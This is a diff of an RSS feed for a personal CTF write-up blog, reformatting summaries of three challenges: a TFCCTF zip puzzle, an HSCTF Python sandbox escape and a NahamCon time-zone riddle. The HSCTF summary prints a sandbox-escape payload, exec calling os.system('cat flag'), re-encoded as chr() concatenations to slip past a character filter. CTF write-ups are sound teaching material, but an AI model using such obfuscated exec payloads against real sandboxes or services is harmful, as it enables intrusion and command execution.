@@ -6,46 +6,28 @@
     <description>Recent content in Misc on Tzion</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 31 Jul 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://tzion0.github.io/tags/misc/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 31 Jul 2022 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://tzion0.github.io/tags/misc/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>[TFCCTF] Secrets Of Tenochtitlan</title>
       <link>https://tzion0.github.io/posts/tfcctf2022-sot/</link>
       <pubDate>Sun, 31 Jul 2022 00:00:00 +0000</pubDate>
-      
       <guid>https://tzion0.github.io/posts/tfcctf2022-sot/</guid>
-      <description>Task source: https://github.com/Tzion0/CTF/tree/master/TFCCTF/2022/SOT
-Description Tenochtitlan was the island capital of the Aztec empire, believed to be founded in 1325, serving as an altar, awaiting the fulfillment of an ancient prophecy. However, it is highly unlikely that this prophecy comes true, as the city of Tenochtitlan, and the Aztec empire fell in 1521 August 13, after holding up for two years against the Spanish forces led by Cortés.
-This challenge provided a zip file.</description>
+      <description>Task source: https://github.com/Tzion0/CTF/tree/master/TFCCTF/2022/SOT&#xA;Description Tenochtitlan was the island capital of the Aztec empire, believed to be founded in 1325, serving as an altar, awaiting the fulfillment of an ancient prophecy. However, it is highly unlikely that this prophecy comes true, as the city of Tenochtitlan, and the Aztec empire fell in 1521 August 13, after holding up for two years against the Spanish forces led by Cortés.&#xA;This challenge provided a zip file.</description>
     </item>
-    
     <item>
       <title>[HSCTF] paas</title>
       <link>https://tzion0.github.io/posts/hsctf2022-paas/</link>
       <pubDate>Fri, 10 Jun 2022 00:00:00 +0000</pubDate>
-      
       <guid>https://tzion0.github.io/posts/hsctf2022-paas/</guid>
-      <description>This is a python sandbox challenge.
-By inputting some characters, we can identify few Illegal characters:
-[]._&amp;#39;&amp;#34; But luckily () is allowed, looking at locals(), we can see exec() is allowed.
-exec() required string argument but unfortunately &#39;&amp;quot; were restricted. However, we found out that chr() is allowed, so let&amp;rsquo;s create our payload:
-Original payload:
-exec(&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat flag&amp;#39;)&amp;#34;) Payload crafted to bypass restrictions:
-exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)) Execute it and got the flag!
-Flag:</description>
+      <description>This is a python sandbox challenge.&#xA;By inputting some characters, we can identify few Illegal characters:&#xA;[]._&amp;#39;&amp;#34; But luckily () is allowed, looking at locals(), we can see exec() is allowed.&#xA;exec() required string argument but unfortunately &#39;&amp;quot; were restricted. However, we found out that chr() is allowed, so let&amp;rsquo;s create our payload:&#xA;Original payload:&#xA;exec(&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat flag&amp;#39;)&amp;#34;) Payload crafted to bypass restrictions:&#xA;exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)) Execute it and got the flag!&#xA;Flag:</description>
     </item>
-    
     <item>
       <title>[NAHAMCONCTF] WhenAmI</title>
       <link>https://tzion0.github.io/posts/nahamconctf2022-whenami/</link>
       <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
-      
       <guid>https://tzion0.github.io/posts/nahamconctf2022-whenami/</guid>
-      <description>Task source: https://github.com/Tzion0/CTF/tree/master/NahamConCTF/2022/Miscellaneous/WhenAmI
-Description I know where I am, but&amp;hellip; when am I?
-This challenge provided a txt file.
-Content of txt file:
-When am I?? So, I look down at my watch. It&amp;#39;s December 28, 2011 at 11:59AM, and I&amp;#39;m just minding my own business at -13.582075733990298, -172.5084838587106. I hung out there until the local time was 1:00AM on December 31st, and then I hopped on a plane and took a 1 hour flight over to -14.</description>
+      <description>Task source: https://github.com/Tzion0/CTF/tree/master/NahamConCTF/2022/Miscellaneous/WhenAmI&#xA;Description I know where I am, but&amp;hellip; when am I?&#xA;This challenge provided a txt file.&#xA;Content of txt file:&#xA;When am I?? So, I look down at my watch. It&amp;#39;s December 28, 2011 at 11:59AM, and I&amp;#39;m just minding my own business at -13.582075733990298, -172.5084838587106. I hung out there until the local time was 1:00AM on December 31st, and then I hopped on a plane and took a 1 hour flight over to -14.</description>
     </item>
-    
   </channel>
 </rss>
